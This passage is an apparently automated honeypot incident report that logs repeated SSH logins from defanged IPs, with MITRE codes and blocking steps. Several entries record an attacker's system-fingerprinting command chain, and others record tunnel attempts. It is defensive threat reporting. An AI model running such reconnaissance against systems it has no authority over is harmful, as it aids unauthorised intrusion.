| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:45:35` | `cowrie.session.connect` |
| `2026-07-04 15:45:35` | `cowrie.client.version` |
| `2026-07-04 15:45:35` | `cowrie.client.kex` |
| `2026-07-04 15:45:37` | `cowrie.login.success` |
| `2026-07-04 15:45:39` | `cowrie.session.params` |
| `2026-07-04 15:45:39` | `cowrie.command.input` |
| `2026-07-04 15:45:39` | `cowrie.command.input` |
| `2026-07-04 15:45:39` | `cowrie.command.input` |
| `2026-07-04 15:45:39` | `cowrie.command.input` |
| `2026-07-04 15:45:39` | `cowrie.command.input` |
| `2026-07-04 15:45:39` | `cowrie.command.success` |
| `2026-07-04 15:45:39` | `cowrie.command.input` |
| `2026-07-04 15:45:39` | `cowrie.command.input` |
| `2026-07-04 15:45:39` | `cowrie.command.input` |
| `2026-07-04 15:45:39` | `cowrie.command.input` |
| `2026-07-04 15:45:39` | `cowrie.log.closed` |
| `2026-07-04 15:45:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f1e5efbb1f9

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 15:46 |
| **Last Seen** | 2026-07-04 15:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:46:06` | `cowrie.session.connect` |
| `2026-07-04 15:46:06` | `cowrie.client.version` |
| `2026-07-04 15:46:06` | `cowrie.client.kex` |
| `2026-07-04 15:46:07` | `cowrie.login.success` |
| `2026-07-04 15:46:07` | `cowrie.direct-tcpip.request` |
| `2026-07-04 15:46:07` | `cowrie.direct-tcpip.data` |
| `2026-07-04 15:46:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bdb5da67468

| Field | Detail |
|---|---|
| **Source IP** | `36.212.129[.]250` |
| **First Seen** | 2026-07-04 15:47 |
| **Last Seen** | 2026-07-04 15:49 |
| **Session Duration** | 133s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:47:00` | `cowrie.session.connect` |
| `2026-07-04 15:47:26` | `cowrie.client.version` |
| `2026-07-04 15:47:26` | `cowrie.client.kex` |
| `2026-07-04 15:47:27` | `cowrie.login.success` |
| `2026-07-04 15:49:13` | `cowrie.session.file_upload` |
| `2026-07-04 15:49:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.212.129[.]250` to AbuseIPDB if not already reported
- [ ] Block `36.212.129[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18189fbd6e97

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 15:47 |
| **Last Seen** | 2026-07-04 15:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:47:35` | `cowrie.session.connect` |
| `2026-07-04 15:47:35` | `cowrie.client.version` |
| `2026-07-04 15:47:35` | `cowrie.client.kex` |
| `2026-07-04 15:47:37` | `cowrie.login.success` |
| `2026-07-04 15:47:38` | `cowrie.session.params` |
| `2026-07-04 15:47:38` | `cowrie.command.input` |
| `2026-07-04 15:47:38` | `cowrie.command.input` |
| `2026-07-04 15:47:38` | `cowrie.command.input` |
| `2026-07-04 15:47:38` | `cowrie.command.input` |
| `2026-07-04 15:47:38` | `cowrie.command.input` |
| `2026-07-04 15:47:38` | `cowrie.command.success` |
| `2026-07-04 15:47:38` | `cowrie.command.input` |
| `2026-07-04 15:47:38` | `cowrie.command.input` |
| `2026-07-04 15:47:38` | `cowrie.command.input` |
| `2026-07-04 15:47:38` | `cowrie.command.input` |
| `2026-07-04 15:47:38` | `cowrie.log.closed` |
| `2026-07-04 15:47:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78283a95a988

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 15:48 |
| **Last Seen** | 2026-07-04 15:48 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:48:06` | `cowrie.session.connect` |
| `2026-07-04 15:48:08` | `cowrie.client.version` |
| `2026-07-04 15:48:08` | `cowrie.client.kex` |
| `2026-07-04 15:48:15` | `cowrie.login.success` |
| `2026-07-04 15:48:18` | `cowrie.session.params` |
| `2026-07-04 15:48:18` | `cowrie.command.input` |
| `2026-07-04 15:48:20` | `cowrie.log.closed` |
| `2026-07-04 15:48:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61b4eae2493f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 15:49 |
| **Last Seen** | 2026-07-04 15:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:49:15` | `cowrie.session.connect` |
| `2026-07-04 15:49:15` | `cowrie.client.version` |
| `2026-07-04 15:49:15` | `cowrie.client.kex` |
| `2026-07-04 15:49:16` | `cowrie.login.success` |
| `2026-07-04 15:49:16` | `cowrie.direct-tcpip.request` |
| `2026-07-04 15:49:16` | `cowrie.direct-tcpip.data` |
| `2026-07-04 15:49:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a977dbd745b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 15:49 |
| **Last Seen** | 2026-07-04 15:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:49:27` | `cowrie.session.connect` |
| `2026-07-04 15:49:27` | `cowrie.client.version` |
| `2026-07-04 15:49:27` | `cowrie.client.kex` |
| `2026-07-04 15:49:29` | `cowrie.login.success` |
| `2026-07-04 15:49:30` | `cowrie.session.params` |
| `2026-07-04 15:49:30` | `cowrie.command.input` |
| `2026-07-04 15:49:30` | `cowrie.command.input` |
| `2026-07-04 15:49:30` | `cowrie.command.input` |
| `2026-07-04 15:49:30` | `cowrie.command.input` |
| `2026-07-04 15:49:30` | `cowrie.command.input` |
| `2026-07-04 15:49:30` | `cowrie.command.success` |
| `2026-07-04 15:49:30` | `cowrie.command.input` |
| `2026-07-04 15:49:30` | `cowrie.command.input` |
| `2026-07-04 15:49:30` | `cowrie.command.input` |
| `2026-07-04 15:49:30` | `cowrie.command.input` |
| `2026-07-04 15:49:31` | `cowrie.log.closed` |
| `2026-07-04 15:49:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d5dfa6027f8

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-04 15:51 |
| **Last Seen** | 2026-07-04 15:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:51:16` | `cowrie.session.connect` |
| `2026-07-04 15:51:16` | `cowrie.client.version` |
| `2026-07-04 15:51:16` | `cowrie.client.kex` |
| `2026-07-04 15:51:17` | `cowrie.login.success` |
| `2026-07-04 15:51:18` | `cowrie.session.params` |
| `2026-07-04 15:51:18` | `cowrie.command.input` |
| `2026-07-04 15:51:18` | `cowrie.log.closed` |
| `2026-07-04 15:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2119f0f7ca3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 15:51 |
| **Last Seen** | 2026-07-04 15:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:51:20` | `cowrie.session.connect` |
| `2026-07-04 15:51:20` | `cowrie.client.version` |
| `2026-07-04 15:51:20` | `cowrie.client.kex` |
| `2026-07-04 15:51:22` | `cowrie.login.success` |
| `2026-07-04 15:51:23` | `cowrie.session.params` |
| `2026-07-04 15:51:23` | `cowrie.command.input` |
| `2026-07-04 15:51:23` | `cowrie.command.input` |
| `2026-07-04 15:51:23` | `cowrie.command.input` |
| `2026-07-04 15:51:23` | `cowrie.command.input` |
| `2026-07-04 15:51:23` | `cowrie.command.input` |
| `2026-07-04 15:51:23` | `cowrie.command.success` |
| `2026-07-04 15:51:23` | `cowrie.command.input` |
| `2026-07-04 15:51:23` | `cowrie.command.input` |
| `2026-07-04 15:51:23` | `cowrie.command.input` |
| `2026-07-04 15:51:23` | `cowrie.command.input` |
| `2026-07-04 15:51:24` | `cowrie.log.closed` |
| `2026-07-04 15:51:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9986794b784e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 15:51 |
| **Last Seen** | 2026-07-04 15:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:51:55` | `cowrie.session.connect` |
| `2026-07-04 15:51:55` | `cowrie.client.version` |
| `2026-07-04 15:51:55` | `cowrie.client.kex` |
| `2026-07-04 15:51:55` | `cowrie.login.success` |
| `2026-07-04 15:51:55` | `cowrie.direct-tcpip.request` |
| `2026-07-04 15:51:55` | `cowrie.direct-tcpip.data` |
| `2026-07-04 15:51:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11470115746a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 15:53 |
| **Last Seen** | 2026-07-04 15:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:53:16` | `cowrie.session.connect` |
| `2026-07-04 15:53:16` | `cowrie.client.version` |
| `2026-07-04 15:53:16` | `cowrie.client.kex` |
| `2026-07-04 15:53:18` | `cowrie.login.success` |
| `2026-07-04 15:53:19` | `cowrie.session.params` |
| `2026-07-04 15:53:19` | `cowrie.command.input` |
| `2026-07-04 15:53:19` | `cowrie.command.input` |
| `2026-07-04 15:53:19` | `cowrie.command.input` |
| `2026-07-04 15:53:19` | `cowrie.command.input` |
| `2026-07-04 15:53:19` | `cowrie.command.input` |
| `2026-07-04 15:53:19` | `cowrie.command.success` |
| `2026-07-04 15:53:19` | `cowrie.command.input` |
| `2026-07-04 15:53:19` | `cowrie.command.input` |
| `2026-07-04 15:53:19` | `cowrie.command.input` |
| `2026-07-04 15:53:19` | `cowrie.command.input` |
| `2026-07-04 15:53:19` | `cowrie.log.closed` |
| `2026-07-04 15:53:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4ca85432a92

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 15:54 |
| **Last Seen** | 2026-07-04 15:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:54:52` | `cowrie.session.connect` |
| `2026-07-04 15:54:52` | `cowrie.client.version` |
| `2026-07-04 15:54:53` | `cowrie.client.kex` |
| `2026-07-04 15:54:53` | `cowrie.login.success` |
| `2026-07-04 15:54:53` | `cowrie.direct-tcpip.request` |
| `2026-07-04 15:54:53` | `cowrie.direct-tcpip.data` |
| `2026-07-04 15:54:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0169115d30ce

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 15:55 |
| **Last Seen** | 2026-07-04 15:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:55:15` | `cowrie.session.connect` |
| `2026-07-04 15:55:15` | `cowrie.client.version` |
| `2026-07-04 15:55:15` | `cowrie.client.kex` |
| `2026-07-04 15:55:17` | `cowrie.login.success` |
| `2026-07-04 15:55:19` | `cowrie.session.params` |
| `2026-07-04 15:55:19` | `cowrie.command.input` |
| `2026-07-04 15:55:19` | `cowrie.command.input` |
| `2026-07-04 15:55:19` | `cowrie.command.input` |
| `2026-07-04 15:55:19` | `cowrie.command.input` |
| `2026-07-04 15:55:19` | `cowrie.command.input` |
| `2026-07-04 15:55:19` | `cowrie.command.success` |
| `2026-07-04 15:55:19` | `cowrie.command.input` |
| `2026-07-04 15:55:19` | `cowrie.command.input` |
| `2026-07-04 15:55:19` | `cowrie.command.input` |
| `2026-07-04 15:55:19` | `cowrie.command.input` |
| `2026-07-04 15:55:19` | `cowrie.log.closed` |
| `2026-07-04 15:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2e4f8ffb1c4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 15:57 |
| **Last Seen** | 2026-07-04 15:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:57:20` | `cowrie.session.connect` |
| `2026-07-04 15:57:21` | `cowrie.client.version` |
| `2026-07-04 15:57:21` | `cowrie.client.kex` |
| `2026-07-04 15:57:22` | `cowrie.login.success` |
| `2026-07-04 15:57:23` | `cowrie.session.params` |
| `2026-07-04 15:57:23` | `cowrie.command.input` |
| `2026-07-04 15:57:23` | `cowrie.command.input` |
| `2026-07-04 15:57:23` | `cowrie.command.input` |
| `2026-07-04 15:57:23` | `cowrie.command.input` |
| `2026-07-04 15:57:23` | `cowrie.command.input` |
| `2026-07-04 15:57:23` | `cowrie.command.success` |
| `2026-07-04 15:57:23` | `cowrie.command.input` |
| `2026-07-04 15:57:23` | `cowrie.command.input` |
| `2026-07-04 15:57:23` | `cowrie.command.input` |
| `2026-07-04 15:57:23` | `cowrie.command.input` |
| `2026-07-04 15:57:23` | `cowrie.log.closed` |
| `2026-07-04 15:57:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55fc05f4034f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 15:59 |
| **Last Seen** | 2026-07-04 15:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:59:00` | `cowrie.session.connect` |
| `2026-07-04 15:59:00` | `cowrie.client.version` |
| `2026-07-04 15:59:00` | `cowrie.client.kex` |
| `2026-07-04 15:59:01` | `cowrie.login.success` |
| `2026-07-04 15:59:01` | `cowrie.direct-tcpip.request` |
| `2026-07-04 15:59:01` | `cowrie.direct-tcpip.data` |
| `2026-07-04 15:59:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbdedfb87047

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 15:59 |
| **Last Seen** | 2026-07-04 15:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:59:34` | `cowrie.session.connect` |
| `2026-07-04 15:59:34` | `cowrie.client.version` |
| `2026-07-04 15:59:34` | `cowrie.client.kex` |
| `2026-07-04 15:59:35` | `cowrie.login.success` |
| `2026-07-04 15:59:36` | `cowrie.session.params` |
| `2026-07-04 15:59:36` | `cowrie.command.input` |
| `2026-07-04 15:59:36` | `cowrie.command.input` |
| `2026-07-04 15:59:36` | `cowrie.command.input` |
| `2026-07-04 15:59:36` | `cowrie.command.input` |
| `2026-07-04 15:59:36` | `cowrie.command.input` |
| `2026-07-04 15:59:36` | `cowrie.command.success` |
| `2026-07-04 15:59:36` | `cowrie.command.input` |
| `2026-07-04 15:59:36` | `cowrie.command.input` |
| `2026-07-04 15:59:36` | `cowrie.command.input` |
| `2026-07-04 15:59:36` | `cowrie.command.input` |
| `2026-07-04 15:59:37` | `cowrie.log.closed` |
| `2026-07-04 15:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76f3f5d06c20

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 16:00 |
| **Last Seen** | 2026-07-04 16:00 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:00:44` | `cowrie.session.connect` |
| `2026-07-04 16:00:47` | `cowrie.client.version` |
| `2026-07-04 16:00:47` | `cowrie.client.kex` |
| `2026-07-04 16:00:53` | `cowrie.login.success` |
| `2026-07-04 16:00:57` | `cowrie.session.params` |
| `2026-07-04 16:00:57` | `cowrie.command.input` |
| `2026-07-04 16:00:59` | `cowrie.log.closed` |
| `2026-07-04 16:00:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

